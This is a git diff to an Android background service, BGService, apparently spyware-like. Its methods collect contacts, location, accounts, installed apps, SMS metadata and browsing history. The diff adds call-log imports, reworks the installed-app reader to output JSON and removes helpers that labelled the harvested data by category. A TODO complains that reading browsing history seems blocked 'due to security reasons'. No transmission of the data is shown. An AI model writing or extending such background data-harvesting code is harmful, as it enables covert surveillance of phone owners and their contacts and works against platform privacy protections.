@@ -11,7 +11,9 @@ import android.content.SharedPreferences;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
+import android.net.Uri;
 import android.os.IBinder;
+import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.support.annotation.Nullable;
 import android.text.LoginFilter;
@@ -100,7 +102,7 @@ public class BGService extends Service {
     }
 
     /**
-     * @return JSONObject containing all the information on contact
+     * @return JSONObject containing all the information on contact.
      */
     private JSONObject contactReader(){
         JSONObject jsonFinal = new JSONObject();
@@ -172,9 +174,10 @@ public class BGService extends Service {
         return location;
     }
 
-    private ArrayList<String> applicationReader(){
-        ArrayList<String> fileList = new ArrayList<>();
-        // TODO fun stuff
+    /**
+     * @return JSONObject containing installed packages names on android device.
+     */
+    private JSONObject applicationReader(){
         JSONObject jsonFinal = new JSONObject();
         JSONArray jsonAppArray = new JSONArray();
         PackageManager pm = getPackageManager();
@@ -194,8 +197,7 @@ public class BGService extends Service {
         } catch (JSONException jsonException){
             jsonException.printStackTrace();
         }
-        // TODO fun stuff
-        return fileList;
+        return jsonFinal;
     }
 
     private ArrayList<String> smsMetaDataReader(){
@@ -207,51 +209,7 @@ public class BGService extends Service {
     private ArrayList<String> navigationHistoryReader(){
         ArrayList<String> navigationHistoryList = new ArrayList<>();
         // TODO fun stuff
+        // TODO it looks like it is impossible due to security reasons...
         return navigationHistoryList;
     }
-
-    private String formatArray(String origin, ArrayList<String> arrayList){
-        String formatted = "";
-        switch (origin){
-            case "fileReader":
-                formatted = "files";
-                break;
-            case "contactReader":
-                formatted = "contacts";
-                break;
-            case "accountReader":
-                formatted = "account";
-                break;
-            case "locationReader":
-                formatted = "location";
-                break;
-            case "applicationReader":
-                formatted = "application";
-                break;
-            case "smsMetaDataReader":
-                formatted = "sms";
-                break;
-            case "navigationHistoryReader":
-                formatted = "history";
-                break;
-            default:
-                formatted = "general";
-        }
-        formatted += ":";
-        formatted += "{";
-        formatted += convertArraylist(arrayList);
-        formatted += "}";
-        return formatted;
-    }
-
-    private String convertArraylist(ArrayList<String> arrayList){
-        String returned = "";
-        for (String elem : arrayList){
-            returned += elem;
-            returned += ",";
-        }
-        returned = ((returned == null) || (returned.length() == 0)) ? returned : returned.substring(0, returned.length()-1);
-        return returned;
-    }
-
 }
